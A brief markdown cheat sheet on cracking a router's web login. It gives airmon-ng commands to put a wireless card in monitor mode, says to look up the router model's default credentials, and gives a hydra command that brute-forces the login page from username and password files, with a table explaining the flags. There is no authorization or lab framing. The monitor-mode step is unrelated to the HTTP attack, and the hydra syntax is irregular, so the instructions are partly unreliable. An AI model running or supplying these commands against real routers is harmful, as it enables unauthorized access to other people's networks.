# Crack Router Login

- Your card must be in monitor mode
- You must be on the network

```bash
airmon-ng check kill
airmon-ng start wlan0
```

- Visit http://192.168.XXX.1/ and find the router model
- Google for default credentials

```bash
hydra http://[192.168.0.1]/login.html -e ns -F -V -t 4 -L <USERNAMES FILE> -P <PASSWORDS FILE>
```

| Flag  | Description                               |
| :---- | ----------------------------------------: |
| -e ns | tries null and user name for password too |
| -F    | exit when login is found                  |
| -V    | displays the results in the terminal      |
| -t 4  | number of parallel tasks to run           |